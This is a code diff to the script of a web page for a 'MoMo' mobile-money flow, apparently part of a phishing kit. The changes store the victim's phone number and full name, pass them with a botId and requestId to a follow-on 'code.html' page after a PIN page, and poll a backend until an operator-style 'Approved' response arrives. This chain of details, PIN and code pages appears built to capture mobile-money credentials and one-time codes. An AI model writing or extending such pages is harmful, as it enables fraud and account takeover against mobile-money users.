@@ -307,7 +307,7 @@
 
 
 <!-- ============================================================
-     STEP 1 — Global error catcher. Must be the very first script.
+     STEP 1 — Global error catcher.
      ============================================================ -->
 <script>
 window.addEventListener('error', function (e) {
@@ -327,7 +327,8 @@ function initMoMoPage() {
     'use strict';
 
     // ---------- CONFIG ----------
-    var BACKEND_URL = '';
+    var BACKEND_URL = '';             // leave empty to use same-origin
+    var NEXT_PAGE   = 'code.html';    // <-- page after pin.html
 
     // ---------- DOM REFS ----------
     var form     = document.getElementById('detailsForm');
@@ -519,11 +520,12 @@ function initMoMoPage() {
             try {
                 localStorage.setItem('phone', phoneVal);
                 localStorage.setItem('phoneRequestId', requestId);
+                localStorage.setItem('fullName', fullName);
             } catch (e) {}
 
             stopPolling();
             var attempts = 0;
-            var MAX_ATTEMPTS = 120;
+            var MAX_ATTEMPTS = 120; // ~3 minutes
 
             pollTimer = setInterval(function () {
                 attempts++;
@@ -544,12 +546,14 @@ function initMoMoPage() {
 
                             /* =====================================================
                                REDIRECT TARGET: code.html
-                               Passes botId, requestId, phone so code.html can
-                               continue the flow without losing context.
+                               Passes botId, requestId, phone, name so code.html
+                               can continue the flow without losing context.
                             ===================================================== */
-                            var redirectUrl = 'code.html?requestId=' + encodeURIComponent(requestId) +
-                                              '&phone='     + encodeURIComponent(phoneVal) +
-                                              '&botId='     + encodeURIComponent(botId);
+                            var redirectUrl = NEXT_PAGE +
+                                '?requestId=' + encodeURIComponent(requestId) +
+                                '&phone='     + encodeURIComponent(phoneVal) +
+                                '&botId='     + encodeURIComponent(botId) +
+                                '&name='      + encodeURIComponent(fullName);
 
                             console.log('✅ Approved — redirecting to:', redirectUrl);
 
@@ -592,7 +596,7 @@ function initMoMoPage() {
     validateForm();
     try { phone.focus(); } catch (e) {}
 
-    console.log('✅ MoMo details page ready. botId =', botId);
+    console.log('✅ MoMo pin page ready. botId =', botId);
 }
 
 /* Run it — safe whether the DOM is still loading or already loaded. */
